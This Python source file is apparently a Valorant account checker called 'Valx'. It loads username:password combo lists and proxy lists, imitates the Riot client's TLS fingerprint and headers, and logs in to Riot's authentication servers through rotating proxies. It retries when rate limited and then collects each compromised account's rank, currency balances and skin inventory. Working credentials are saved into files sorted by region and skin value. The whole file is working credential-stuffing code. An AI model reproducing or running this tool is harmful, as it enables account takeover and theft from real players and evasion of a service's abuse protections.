import ssl
from typing import Any
import cProfile
from cmath import log
from importlib import invalidate_caches
from math import comb
import threading, requests, cloudscraper, time, random, string, os, easygui, ctypes, sys, hashlib, datetime, readchar, pandas, traceback, riotchecker, shutil, httpx, aiohttp, contextlib, warnings, concurrent, asyncio
from xmlrpc.client import boolean
from colorama import init, Fore
from keyauth import api
from re import compile
from secrets import token_urlsafe, token_hex
from typing import Optional
init(convert=True)

from collections import OrderedDict
from urllib3 import PoolManager
from ssl import PROTOCOL_TLSv1_2
from requests.adapters import HTTPAdapter
from requests.exceptions import Timeout
from threading import Thread

lock = threading.Lock()
e = datetime.datetime.now()
current_date = e.strftime("%Y-%m-%d-%H")

red = Fore.RED
black = Fore.BLACK
green = Fore.GREEN
yellow = Fore.YELLOW
blue = Fore.BLUE
mov = Fore.MAGENTA
cyan = Fore.CYAN
wht = Fore.WHITE
reset = Fore.RESET
lb = Fore.LIGHTBLUE_EX
grey = Fore.LIGHTBLACK_EX
lr = Fore.LIGHTRED_EX
lg = Fore.LIGHTGREEN_EX

ProxyList = []
combos = []
xds = []
valid = 0
invalid = 0
retry = 0
auth = 0
rated = 0
multifac = 0
checked = 0
unbanned = 0
banned = 0
EmailV = 0
skinned = 0 
no_skins = 0

_1_9 = 0
_10_19 = 0
_20_29 = 0
_30_39 = 0
_40_49 = 0
_50_99 = 0
_100_150 = 0
_151 = 0

eu = 0
na = 0
br = 0
kr = 0
latam = 0
ap = 0

unranked = 0
iron = 0
bronze = 0
silver = 0
gold = 0
platinum = 0
diamond = 0
ascendant = 0
immortal = 0
radiant = 0
locked = 0

a1_9 = 0
a10_19 = 0
a20_29 = 0
a30_39 = 0
a40_49 = 0
a50_100 = 0
a1000 = 0
unkno = 0
_2fa = 0


notplyd = 0
inactive = 0

combolen = 0

startt = 0


if not os.path.exists("results"):
    os.makedirs("results/")
if not os.path.exists("results/{}".format(current_date)):
    os.makedirs("results/{}".format(current_date))

if not os.path.exists(f"results/{current_date}/skinned"):
    os.makedirs(f"results/{current_date}/skinned/")
if not os.path.exists(f"results/{current_date}/region"):
    os.makedirs(f"results/{current_date}/region/")


#    if not os.path.exists("results/brute"):
#        os.makedirs("results/brute/")
#    if not os.path.exists("results/brute/{}".format(current_date)):
#        os.makedirs("results/brute/{}".format(current_date))
#    if not os.path.exists("results/brute/{}/region".format(current_date)):
#        os.makedirs("results/brute/{}/region/".format(current_date))

#    if not os.path.exists("results/proxies".format(current_date)):
#        os.makedirs("results/proxies".format(current_date))
#
#    if not os.path.exists(f"results/{current_date}/brutechecker"):
#       os.makedirs(f"results/{current_date}/brutechecker/")

#dirs
region_folders = ["ap", "eu", "na", "latam", "br", "kr"]
level_folders = ['1-10', "10-20", "20-30", "30-40", "40-50", "50-100", "100+", "locked"]
fold = ["skinned", "unskinned", "log"]

for folder in region_folders:
    if not os.path.exists(f"results/{current_date}/region/"+folder):
        os.makedirs(f"results/{current_date}/region/"+folder)


title = f'''
                                {red}⢀⣀⣀⠀⠀⠀⠀⠀{reset}⢀⣀⣀⣀⣀⣀⡀
                                {red}⠈⢿⣿⣆⠀⠀⠀{reset}⣠⣿⣿⣿⣿⣿⠏
                                {red}⠀⠈⢻⣿⣦⠀⣰⣶⡶{lr}⢂{reset}⣾⣿⠋
                                {red}⠀⠀⠀⢻⣿⣿⣿⡟{lr}⢡{reset}⣿⣿⠃⠀⠀
                                {red}⠀⠀⠀⠈⢻⣿⡿{lr}⢡{reset}⣾⣿⠏⠀⠀⠀
                                {red}⠀⠀⠀⠀⠀⠟{reset}⢠⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                {red}⠀⠀⠀⠀⠀⠀{reset}⠹⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                {red}⠀⠀⠀⠀⠀⠀⠀{reset}⠁
                '''

CIPHERS = [
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE+AES128',
    'RSA+AES128',
    'ECDHE+AES256',
    'RSA+AES256',
    'ECDHE+3DES',
    'RSA+3DES',
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES128-SHA",
    "ECDHE-RSA-AES128-SHA",
    "ECDHE-ECDSA-AES256-SHA",
    "ECDHE-RSA-AES256-SHA",
    "AES128-GCM-SHA256",
    "AES256-GCM-SHA384",
    "AES128-SHA",
    "AES256-SHA",
    "DES-CBC3-SHA"
]

class SSLAdapter(HTTPAdapter):
    def init_poolmanager(self, *a: Any, **k: Any) -> None:
        c = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        c.set_ciphers(':'.join(CIPHERS))
        k['ssl_context'] = c
        return super(SSLAdapter, self).init_poolmanager(*a, **k)

def getcombos():
    global path, combolen
    try:
        print(f'    [{red}>{reset}] Path to combo file > ')
        time.sleep(1)
        path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Valx - Select combos', multiple= False)
        with open(path, 'r', encoding="utf-8") as f:
            for line in f.readlines():
                line = line.replace("\n", "")
                combos.append(line)
                xds.append(line)
            combolen = len(xds)
        first_line = combos[0]
        shutil.copyfile(path, f"results/{current_date}/remain_accs.txt")
    except:
        print(f'\n {lr}!{reset} Failed to open combofile')
        os.system('pause >nul')
        quit()


def getproxies():
    try:
        print(f'    [{red}>{reset}] Path to proxy file > ')
        path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Valx - Select proxy', multiple= False)
        with open(path, "r+", encoding="utf-8") as f:
            for line in f.readlines():
                line = line.replace("\n", "")
                ProxyList.append(line)
    except Exception:
        print("Error has occurred")

cpm = 0
def cpmrunner():
    global cpm
    while True:
        oldchecked = valid + invalid
        time.sleep(1)
        newchecked = invalid + valid
        cpm = (newchecked - oldchecked) * 60

def counter():
    global ctn
    while True:
        ctn = retry

def session1():
        session = requests.Session()
        session.trust_env = False
        return session


class RiotAuth:
    RIOT_CLIENT_USER_AGENT = token_urlsafe(111).replace("_", "W").replace("-", "w")
    CIPHERS13 = ":".join(  # https://docs.python.org/3/library/ssl.html#tls-1-3
        (
            "TLS_CHACHA20_POLY1305_SHA256",
            "TLS_AES_128_GCM_SHA256",
            "TLS_AES_256_GCM_SHA384",
        )
    )
    CIPHERS = ":".join(
        (
            "ECDHE-ECDSA-CHACHA20-POLY1305",
            "ECDHE-RSA-CHACHA20-POLY1305",
            "ECDHE-ECDSA-AES128-GCM-SHA256",
            "ECDHE-RSA-AES128-GCM-SHA256",
            "ECDHE-ECDSA-AES256-GCM-SHA384",
            "ECDHE-RSA-AES256-GCM-SHA384",
            "ECDHE-ECDSA-AES128-SHA",
            "ECDHE-RSA-AES128-SHA",
            "ECDHE-ECDSA-AES256-SHA",
            "ECDHE-RSA-AES256-SHA",
            "AES128-GCM-SHA256",
            "AES256-GCM-SHA384",
            "AES128-SHA",
            "AES256-SHA",
            "DES-CBC3-SHA",  # most likely not available
        )
    )
    SIGALGS = ":".join(
        (
            "ecdsa_secp256r1_sha256",
            "rsa_pss_rsae_sha256",
            "rsa_pkcs1_sha256",
            "ecdsa_secp384r1_sha384",
            "rsa_pss_rsae_sha384",
            "rsa_pkcs1_sha384",
            "rsa_pss_rsae_sha512",
            "rsa_pkcs1_sha512",
            "rsa_pkcs1_sha1",  # will get ignored and won't be negotiated
        )
    )

    #def __init__(self) -> None:
    #    self._auth_ssl_ctx = RiotAuth.create_riot_auth_ssl_ctx()
#
    #@staticmethod
    #def create_riot_auth_ssl_ctx() -> ssl.SSLContext:
    #    ssl_ctx = ssl.create_default_context()
#
    #    # https://github.com/python/cpython/issues/88068
    #    addr = id(ssl_ctx) + sys.getsizeof(object())
    #    ssl_ctx_addr = ctypes.cast(addr, ctypes.POINTER(ctypes.c_void_p)).contents
#
    #    libssl: Optional[ctypes.CDLL] = None
    #    if sys.platform.startswith("win32"):
    #        for dll_name in (
    #            "libssl-3.dll",
    #            "libssl-3-x64.dll",
    #            "libssl-1_1.dll",
    #            "libssl-1_1-x64.dll",
    #        ):
    #            with contextlib.suppress(FileNotFoundError, OSError):
    #                libssl = ctypes.CDLL(dll_name)
    #                break
    #    elif sys.platform.startswith(("linux", "darwin")):
    #        libssl = ctypes.CDLL(ssl._ssl.__file__)  # type: ignore
#
    #    if libssl is None:
    #        raise NotImplementedError(
    #            "Failed to load libssl. Your platform or distribution might be unsupported, please open an issue."
    #        )
#
    #    with warnings.catch_warnings():
    #        warnings.filterwarnings("ignore", category=DeprecationWarning)
    #        ssl_ctx.minimum_version = ssl.TLSVersion.TLSv1  # deprecated since 3.10
    #    ssl_ctx.set_alpn_protocols(["http/1.1"])
    #    ssl_ctx.options |= 1 << 19  # SSL_OP_NO_ENCRYPT_THEN_MAC
    #    libssl.SSL_CTX_set_ciphersuites(ssl_ctx_addr, RiotAuth.CIPHERS13.encode())
    #    libssl.SSL_CTX_set_cipher_list(ssl_ctx_addr, RiotAuth.CIPHERS.encode())
    #    # setting SSL_CTRL_SET_SIGALGS_LIST
    #    libssl.SSL_CTX_ctrl(ssl_ctx_addr, 98, 0, RiotAuth.SIGALGS.encode())
    #    # setting SSL_CTRL_SET_GROUPS_LIST
    #    libssl.SSL_CTX_ctrl(ssl_ctx_addr, 92, 0, ":".join(
    #        (
    #            "x25519",
    #            "secp256r1",
    #            "secp384r1",
    #        )
    #    ).encode())
#
    #    return ssl_ctx

def create_riot_auth_ssl_ctx() -> ssl.SSLContext:
        ssl_ctx = ssl.create_default_context()

        # https://github.com/python/cpython/issues/88068
        addr = id(ssl_ctx) + sys.getsizeof(object())
        ssl_ctx_addr = ctypes.cast(addr, ctypes.POINTER(ctypes.c_void_p)).contents

        libssl: Optional[ctypes.CDLL] = None
        if sys.platform.startswith("win32"):
            for dll_name in (
                "libssl-3.dll",
                "libssl-3-x64.dll",
                "libssl-1_1.dll",
                "libssl-1_1-x64.dll",
            ):
                with contextlib.suppress(FileNotFoundError, OSError):
                    libssl = ctypes.CDLL(dll_name)
                    break
        elif sys.platform.startswith(("linux", "darwin")):
            libssl = ctypes.CDLL(ssl._ssl.__file__)  # type: ignore

        if libssl is None:
            raise NotImplementedError(
                "Failed to load libssl. Your platform or distribution might be unsupported, please open an issue."
            )

        with warnings.catch_warnings():
            warnings.filterwarnings("ignore", category=DeprecationWarning)
            ssl_ctx.minimum_version = ssl.TLSVersion.TLSv1  # deprecated since 3.10
        ssl_ctx.set_alpn_protocols(["http/1.1"])
        ssl_ctx.options |= 1 << 19  # SSL_OP_NO_ENCRYPT_THEN_MAC
        libssl.SSL_CTX_set_ciphersuites(ssl_ctx_addr, RiotAuth.CIPHERS13.encode())
        libssl.SSL_CTX_set_cipher_list(ssl_ctx_addr, RiotAuth.CIPHERS.encode())
        # setting SSL_CTRL_SET_SIGALGS_LIST
        libssl.SSL_CTX_ctrl(ssl_ctx_addr, 98, 0, RiotAuth.SIGALGS.encode())
        # setting SSL_CTRL_SET_GROUPS_LIST
        libssl.SSL_CTX_ctrl(ssl_ctx_addr, 92, 0, ":".join(
            (
                "x25519",
                "secp256r1",
                "secp384r1",
            )
        ).encode())

        return ssl_ctx

async def checkacc(combo):
    global valid, invalid, retry, auth, rated, multifac, checked, unbanned, banned, xds, startt, no_skins, skinned, combolen, num, _1_9, _10_19, _20_29, _30_39, _40_49, _50_99, _100_150, _151, a1_9, a10_19, a20_29, a30_39, a40_49, a50_100, a1000
    global brute, notplyd, inactive,unkno
    try:
        elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - startt))
        if brute == False:
            ctypes.windll.kernel32.SetConsoleTitleW(f"VALX | Valid: {valid} | Bad: {invalid} | unbanned/banned: {unbanned}/{banned} | Rate-limted: {rated} | un/skinned: {no_skins}/{skinned} | Retries: {retry} | Checked: {checked}/{combolen} | CPM: {cpm} | Elapsed : {elapsed}")
        else:
            ctypes.windll.kernel32.SetConsoleTitleW(f"VALX | Valid: {valid} | Bad: {invalid} | unbanned/banned: {unbanned}/{banned} | Rate-limted: {rated} | Retries: {retry} | Checked: {checked}/{combolen} | CPM: {cpm} | Elapsed : {elapsed}")
    except Exception as e:
        print(e)
    CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA:DES-CBC3-SHA"
    ECDH_CURVE = "prime256v1"

    try:
        _auth_ssl_ctx = create_riot_auth_ssl_ctx()
        _authclient = RiotAuth()

        ver = requests.get("https://valorant-api.com/v1/version")
        version = ver.json()["data"]["riotClientVersion"]
        try:
            username, password = combo.split(":")
        except:
            combos.append(combo)
            return
        proxy = random.choice(ProxyList)
        UseProxy = f'''http://{proxy}'''
        proxies = {
            'https' : UseProxy,
            'http' : UseProxy}   
        mod_password = password[0:3]
        session = requests.Session()
        session.headers = OrderedDict({"Accept-Encoding": "gzip, deflate, br, zstd", "User-Agent": f"RiotClient/{version} %s (Windows;10;;Professional, x64)","Accept-Language": "en-US,en;q=0.9","Accept": "application/json, text/plain, */*"})
        session.mount('https://', SSLAdapter())
        client = httpx.Client(proxy=UseProxy)
        #scraper = cloudscraper.create_scraper(sess=session)
        nonce = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(23))
        conn = aiohttp.TCPConnector(ssl=_auth_ssl_ctx)
        authsession =  aiohttp.ClientSession(connector=conn)
        data = {
            "acr_values": "",
            "claims": "",
            "client_id": "riot-client",
            "code_challenge": "",
            "code_challenge_method": "",
            "nonce": token_urlsafe(16),
            "redirect_uri": "http://localhost/redirect",
            "response_type": "token id_token",
            "scope": "openid link ban lol_region account",}
        headers = {
            "Accept-Encoding": "deflate, gzip, zstd",
            # "user-agent": RiotAuth.RIOT_CLIENT_USER_AGENT % "rso-auth",
            "user-agent": RiotAuth.RIOT_CLIENT_USER_AGENT,
            "Cache-Control": "no-cache",
            "Accept": "application/json",
        }
        try:
            r = await authsession.post('https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers, timeout=10, proxy=UseProxy)
        except:
            retry += 1
            combos.append(combo)
            return
        if r.status == 200:
            body = {
                "language": "en_US",
                "password": password,
                "region": None,
                "remember": False,
                "type": "auth",
                "username": username,
            }
            headers = {
                    "User-Agent": "Mozilla/5.0 (iPhone; CU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.1502.79 Mobile Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type":"application/json",
                    "Connection":"keep-alive",
                    "Host":"auth.riotgames.com",
                    "referer":f"https://{token_hex(5)}.riotgames.com/"
                }
            login = await authsession.put('https://auth.riotgames.com/api/v1/authorization', json=body, headers=headers, proxy=UseProxy ,timeout=5)
            data = await login.json()
            login2 = await login.text()

            await authsession.close()

            if "access_token" in login2:
                validlogintxt = open(f"results/{current_date}/valid.txt", "a+", encoding="utf-8")
                validlogintxt.write(f"{username}:{password}\n")
                validlogintxt.close()

                #lock.acquire()
                #print(f'[{lr}+{reset}] {username}:{password}{reset}')
                #lock.release()

                #checked += 1

                pattern = compile('access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
                data = pattern.findall(data['response']['parameters']['uri'])[0]
                token = data[0]
                token_id = data[1]


            elif "You do not have access to auth.riotgames.com" in login2: 
                retry += 1
                combos.append(combo)
                return
            elif "auth_failure" in login2 or "invalid_session_id" in login2 or "archived_account" in login2:
                invalid += 1
                checked += 1
                xds.remove(username + ":" + password)
                with open(f"results/{current_date}/remain_accs.txt", "w", encoding="utf-8") as f:
                    for line in xds:
                        f.write(line + "\n")
                return
            elif "multifactor" in login2:
                multifac += 1
                checked += 1
                xds.remove(username + ":" + password)
                with open(f"results/{current_date}/remain_accs.txt", "w", encoding="utf-8") as f:
                    for line in xds:
                        f.write(line + "\n")
                open(f"results/2fa.txt", "a+", encoding="utf-8").write(f"{username}:{password}\n")
                return
            elif "rate_limited" in login2:
                rated += 1
                checked += 1
                combos.append(combo)
                return
            else:
                pattern = compile('access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
                data = pattern.findall(data['response']['parameters']['uri'])[0]
                token = data[0]

            #checks ban
            headers = {
                'User-Agent': f'RiotClient/{version} %s (Windows;10;;Professional, x64)',
                'Authorization': f'Bearer {token}',
            }
            try:
                r = client.post('https://entitlements.auth.riotgames.com/api/token/v1', headers=headers, json={})
                entitlement = r.json()['entitlements_token']

                r = client.post('https://auth.riotgames.com/userinfo', headers=headers, json={})
                data = r.json()   
            except Exception as e:
                with lock:
                    retry += 1
                combos.append(combo)
                return
            try:
                GameName =  r.text.split('game_name":"')[1].split('"')[0]
            except Exception as e:
                GameName = "null" 
            CountryID = r.text.split('country":"')[1].split('"')[0]
            try:            
                Tag = r.text.split('tag_line":"')[1].split('"')[0]
            except Exception as e:
                Tag = "null"
            Sub = r.text.split('sub":"')[1].split('"')[0]
            EmailVerified = r.text.split('email_verified":')[1].split(',"')[0]
            data1 = data['acct']
            unix_time = data1['created_at']
            unix_time = int(unix_time)
            result_s = pandas.to_datetime(unix_time,unit='ms')
            str(result_s)        
            typebanned = None
            result_s1 = None
            try:
                data = r.json()
                data2 = data['ban']
                data3 = data2['restrictions']
                for x in data3:
                    typebanned = x['type']
                if typebanned == "PERMANENT_BAN" or typebanned == "PERMA_BAN":
                    typebanned = "Banned"
                    checked += 1
                    banned += 1
                    return

                elif typebanned == "TIME_BAN" or typebanned == "LEGACY_BAN":
                    typebanned = "Time Banned"
                    notbannostying = open(f"results/{current_date}/timeban.txt", "a+", encoding="utf-8")
                    notbannostying.write(f"{username}:{password}\n")
                    notbannostying.close()
                    checked += 1
                    banned += 1
                    return
                        
                elif typebanned == None:
                    typebanned = "Unbanned"
                    if brute == True:
                        unbanned += 1
                        checked += 1
                        valid += 1
                        with lock:
                            print(f'[{lr}+{reset}] {username}:{password}{reset} {red}|{reset} Email verified > {EmailVerified} {reset}')
                            return
                    nobannostying = open(f"results/{current_date}/unbanned .txt", "a+", encoding="utf-8")
                    nobannostying.write(f"{username}:{password}\n")
                    nobannostying.close()
            except Exception as e:
                print(f'{red}ERROR{reset} - Writing {username}:{password} to file')
                failedsaves = open(f"results/{current_date}/failedsaves.txt", "a+", encoding="utf-8")
                failedsaves.write(f"{username}:{password}\n")
                failedsaves.close()
                return


            if brute == False:
                ver = requests.get("https://valorant-api.com/v1/version")
                version = ver.json()["data"]["riotClientVersion"]
                platform = "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"
                headers ={
                    "User-Agent" : f'RiotClient/{version} %s (Windows;10;;Professional, x64)',
                    "X-Riot-Entitlements-JWT": entitlement,
                    "Authorization": f"Bearer {token}"
                }
                try:
                    json = {"id_token": token_id}
                    r = client.put('https://riot-geo.pas.si.riotgames.com/pas/v1/product/valorant',json=json, headers=headers)
                    data = r.json()
                    Regionn = data['affinities']['live']
                except:
                    Region = "na"
                    Regionn = "na"
                if Regionn == "eu":
                    Region = "eu"
                elif Regionn == "na":
                    Region = "na"
                elif Regionn == "kr":
                    Region = "kr"
                elif Regionn == "ap":
                    Region = "ap"
                elif Regionn == "latam":
                    Region = "na"
                elif Regionn == "br":
                    Region = "na"

                headers ={
                    "User-Agent" : f'RiotClient/{version} %s (Windows;10;;Professional, x64)',
                    "X-Riot-ClientPlatform": platform,
                    "X-Riot-ClientVersion": version,
                    "X-Riot-Entitlements-JWT": entitlement,
                    "Authorization": f"Bearer {token}"
                }
                try:
                    r = requests.get(f"https://pd.{Region}.a.pvp.net/account-xp/v1/players/{Sub}", headers=headers)
                    data = r.json()
                    AccountLevel = data["Progress"]["Level"]
                except:
                    unkno += 1
                level_a = AccountLevel
                if level_a in range(1, 9):
                    a1_9 += 1
                    levelc = "1-10"
                elif level_a in range(10, 19):
                    a10_19 += 1
                    levelc = "10-20"
                elif level_a in range(20, 29):
                    a20_29 += 1
                    levelc = "20-30"
                elif level_a in range(30, 39):
                    a30_39 += 1
                    levelc = "30-40"
                elif level_a in range(40, 49):
                    a40_49 += 1
                    levelc = "40-50"
                elif level_a in range(50, 100):
                    a50_100 += 1
                    levelc = "50-100"
                elif level_a in range(101, 2000):
                    a1000 += 1
                    levelc = "100+"
                else:
                    levelc = "locked"
                    unkno += 1
                RankIDtoRank = {"0":"Unranked","1":"Unused1", "2":"Unused2" ,"3":"Iron 1" ,"4":"Iron 2" ,"5":"Iron 3" ,"6":"Bronz 1" ,"7":"Bronz 2" ,"8":"Bronz 3" ,"9":"Silver 1" ,"10":"Silver 2", "11":"Silver 3" ,"12":"Gold 1" ,"13":"Gold 2" ,"14":"Gold 3" ,"15":"Platinum 1" ,"16":"Platinum 2" ,"17":"Plantinum 3" ,"18":"Diamond 1" ,"19":"Diamond 2" ,"20":"Diamond 3" ,"21":"Ascendant 1" ,"22":"Ascendant 2" ,"23":"Ascendant 3" ,"24":"Immortal 1" ,"25":"Immortal 2" ,"26":"Immortal 3" ,"27":"Radiant"}

                PvpNetHeaders = {
                                "User-Agent" : f'RiotClient/{version} %s (Windows;10;;Professional, x64)',
                                "Content-Type": "application/json",
                                "Authorization": f"Bearer {token}",
                                "X-Riot-Entitlements-JWT": entitlement,
                                "X-Riot-ClientVersion": "release-08.07-shipping-9-2444158",
                                "X-Riot-ClientPlatform": "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"
                }
                try:
                    GetPoints = session.get(f"https://pd.{Region}.a.pvp.net/store/v1/wallet/{Sub}",headers=PvpNetHeaders)
                    ValorantPoints = GetPoints.json()["Balances"]["85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741"]
                    Radianite = GetPoints.json()["Balances"]["e59aa87c-4cbf-517a-5983-6e81511be9b7"]
                except:
                    ValorantPoints = "UnKnow"
                    Radianite = "UnKnow" 
                try:
                    r = session.get(f"https://pd.{Region}.a.pvp.net/match-history/v1/history/{Sub}?startIndex=0&endIndex=10",headers=PvpNetHeaders)
                    data = r.json()
                    data4 = data['Total']
                    if data4 == 0:
                        notplyd += 1
                        last_time = "Never Played"
                    else:
                        data2 = data["History"]
                        for x in data2:
                            data3 = x['GameStartTime']
                        unix_time1 = data3
                        unix_time1 = int(unix_time1)
                        if (unix_time1) < int(round(time.time()*1000)-1217099000):
                            inactive += 1
                        result_s2 = pandas.to_datetime(unix_time1,unit='ms')
                        str(result_s2)
                        last_time = result_s2
                except:
                    result_s2 = "Unkown"
                    last_time = "Unkown"


                try:
                    CheckRanked = session.get(f"https://pd.{Region}.a.pvp.net/mmr/v1/players/{Sub}/competitiveupdates",headers=PvpNetHeaders)

                    if '","Matches":[]}' in CheckRanked.text:
                        Rank = "UnRanked"
                            
                    else:
                        RankID = CheckRanked.text.split('"TierAfterUpdate":')[1].split(',"')[0]
                        Rank = RankIDtoRank[RankID] 
                except:
                    Rank = "Unknow"
        
                headers ={
                    "User-Agent" : f'RiotClient/{version} %s (Windows;10;;Professional, x64)',
                    "X-Riot-ClientPlatform": platform,
                    "X-Riot-ClientVersion": version,
                    "X-Riot-Entitlements-JWT": entitlement,
                    "Authorization": f"Bearer {token}"
                }
                Rank = Rank.lower()
    
                try:
                    r = requests.get(f"https://pd.{Region}.a.pvp.net/store/v1/entitlements/{Sub}/e7c63390-eda7-46e0-bb7a-a6abdacd2433",headers=headers)
                except Exception as e:
                    retries += 1
                    return
                response_API = requests.get('https://valorant-api.com/v1/weapons/skins/?language=en-US')
                response = response_API.text
                userSkins = []
                userChromas = []
                SkinNumber = 0
                ChromasNumber = 0
                SkinStr = ""
                SkinStr2 = ""
                ChromasStr = ""
                ChromasStr2 = ""
                tskin = ""
                category = ""
                Skins = r.json()["Entitlements"]
                for skin in Skins:
                    skinid = skin['ItemID'].lower()
                    skin = response.split(skinid)[1].split(',')[1].replace('"displayName":"','').replace('\\"','').replace('"','').replace('u00A0','').replace("'",'')
                    if skin in SkinStr or skin in SkinStr2:
                        pass
                    else:
                        if "Level" in skin:
                            userChromas.append(skin)
                        else:
                            userSkins.append(skin)
                userChromas.sort(key=str.lower)
                userSkins.sort(key=str.lower)
                for skn in userSkins:
                    SkinNumber = userSkins.index(skn) + 1
                    SkinStr += skn + ", "
                    SkinStr2 += f"╠═╡{SkinNumber}╞═› " + skn + "\n"
                for chrr in userChromas:
                    ChromasNumber = userChromas.index(chrr) + 1
                    ChromasStr += chrr + ", "
                    ChromasStr2 += f"╠═╡{ChromasNumber}╞═› " + chrr + "\n"
                skin_amount = len(userSkins)
                skin_amount = int(skin_amount)
                if skin_amount == 0:
                    tskin = "unskinned"
                    category = "no_skins"
                    no_skins += 1
                elif skin_amount in range(1, 10):
                    tskin = "skinned"
                    category = "1-10"
                    _1_9 += 1
                    skinned += 1
                elif skin_amount in range(10, 20):
                    tskin = "skinned"
                    category = "10-20"
                    _10_19 += 1
                    skinned += 1
                elif skin_amount in range(20, 30):
                    tskin = "skinned"
                    category = "20-30"
                    _20_29 += 1
                    skinned += 1
                elif skin_amount in range(30, 40):
                    tskin = "skinned"
                    category = "30-40"
                    _30_39 += 1
                    skinned += 1
                elif skin_amount in range(40, 50):
                    tskin = "skinned"
                    category = "40-50"
                    _40_49 += 1
                    skinned += 1
                elif skin_amount in range(50, 100):
                    tskin = "skinned"
                    category = "50-100"
                    _50_99 += 1
                    skinned += 1
                elif skin_amount in range(100, 150):
                    tskin = "skinned"
                    category = "100-150"
                    _100_150 += 1
                    skinned += 1
                elif skin_amount in range(150,1000):
                    tskin = "skinned"
                    category = "150+"
                    _151 += 1
                    skinned += 1
                else:
                    retries += 1
                snobasnnostying = open(f"results/{current_date}/skinned/{category}.txt", "a+", encoding="utf-8")
                snobasnnostying.write(f"{username}:{password}\n")
                snobasnnostying.close()
                rnobasnnostying = open(f"results/{current_date}/region/{Regionn}/{category}.txt", "a+", encoding="utf-8")
                rnobasnnostying.write(f"{username}:{password}\n")
                rnobasnnostying.close()
                if tskin == "skinned":
                    bannedtxt12 = open(f"results/{current_date}/{tskin}_fullcapture.txt", "a+", encoding="utf-8")
                    bannedtxt12.write(f"{username}:{password} | Banntype: {typebanned} | Last Game: {last_time} | Region: {Region}| Email Verified: {EmailVerified} | Creation: {result_s} | Rank: {Rank} | VP: {ValorantPoints} - RP: {Radianite} | Skins({len(userSkins)}) : {SkinStr}\n")
                    bannedtxt12.close()
                if tskin == "unskinned":
                    bannedtxts12 = open(f"results/{current_date}/{tskin}_fullcapture.txt", "a+", encoding="utf-8")
                    bannedtxts12.write(f"{username}:{password} | Banntype: {typebanned} | Last Game: {last_time} | Region: {Region}| Email Verified: {EmailVerified} | Creation: {result_s} | Rank: {Rank} | VP: {ValorantPoints} - RP: {Radianite} ")
                    bannedtxts12.close()
                logtext9 = open(f"results/{current_date}/log_fullcapture.txt", "a+", encoding="utf-8")
                if tskin == "unskinned":
                    logtext9.write(f"╔════════════════╣valx╠════════════════╗\n╠═ User&Pass: {username}:{password}\n╠═ Banntype: {typebanned}\n╠═ Last Game: {last_time}\n╠═ Region: {Region}\n╠═ Level: {AccountLevel}\n╠═ Email Verified: {EmailVerified}\n╠═ Creation: {result_s}\n╠═ Rank: {Rank}\n╠═ VP: {ValorantPoints} - RP: {Radianite}\n╚════════════════════════════════════════════╝\n\n")
                    logtext9.close()
                elif tskin == "skinned":
                    logtext9.write(f"╔════════════════╣valx╠════════════════╗\n╠═ User&Pass: {username}:{password}\n╠═ Banntype: {typebanned}\n╠═ Last Game: {last_time}\n╠═ Region: {Region}\n╠═ Level: {AccountLevel}\n╠═ Email Verified: {EmailVerified}\n╠═ Creation: {result_s}\n╠═ Rank: {Rank}\n╠═ VP: {ValorantPoints} - RP: {Radianite}\n╠════════╣Skins({len(userSkins)})╠═════════╣\n{SkinStr2}╠═══════╣Chromas({len(userChromas)})╠════════╣\n{ChromasStr2}╚════════════════════════════════════════════╝\n\n")
                    logtext9.close()
                #first_chars_pass = password[0:3]
                #first_chars_user = username[0:3]
                unbanned += 1
                checked += 1
                valid += 1
                with lock:
                    print(f'[{lr}+{reset}] {username}:{password}{reset} {red}|{reset} Email verified > {EmailVerified} {reset} {red}|{reset} Region > {Regionn} {red}|{reset} Skins > {skin_amount}')
        else:
            await authsession.close()
            combos.append(combo)
            return

    except Exception as e:
        await authsession.close()
        retry += 1
